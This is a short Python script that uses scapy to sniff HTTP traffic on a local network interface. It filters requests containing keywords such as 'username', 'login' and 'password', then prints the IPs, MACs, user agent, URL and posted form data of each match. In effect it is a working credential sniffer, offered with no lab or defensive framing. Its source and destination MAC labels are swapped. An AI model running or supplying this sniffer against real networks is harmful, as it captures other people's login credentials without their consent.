#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed)
def sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            #print(packet.show())
            keywords = ['username', 'pwd','username','user', 'uname', 'login', 'password', 'pass']
            for keyword in keywords:
                if keyword.encode() in load:
                    print("-------------------------------------------------------")
                    print("Source IP: "+ str(packet[scapy.IP].src))
                    print("Destination IP: "+ str(packet[scapy.IP].dst))
                    print("Destination Mac: " + str(packet.src))
                    print("Source Mac: " + str(packet.dst))
                    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                    #surl=packet[http.HTTPRequest].Referer
                    client = packet[http.HTTPRequest].User_Agent
                    print('User Agent: '+str(client).split('\'')[1])
                    print('Destination url: '+str(url).split('\'')[1])
                    #print('Referer url: '+str(surl).split('\'')[1])
                    print('Posted data: '+str(load).split('\'')[1])
                    print("-------------------------------------------------------")
                    break

sniff('enp0s3')